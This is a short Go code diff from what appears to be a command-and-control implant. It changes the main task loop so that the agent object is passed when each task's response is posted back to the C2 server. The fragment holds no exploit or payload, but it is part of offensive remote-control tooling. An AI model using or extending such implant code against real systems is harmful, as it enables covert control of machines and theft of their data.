@@ -174,7 +174,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 			// Process tasks
 			for _, task := range tasks {
 				response := processTask(task)
-				if err := c2.PostResponse(response); err != nil {
+				if err := c2.PostResponse(response, agent); err != nil {
 					log.Printf("[ERROR] Failed to post response: %v", err)
 				}
 			}
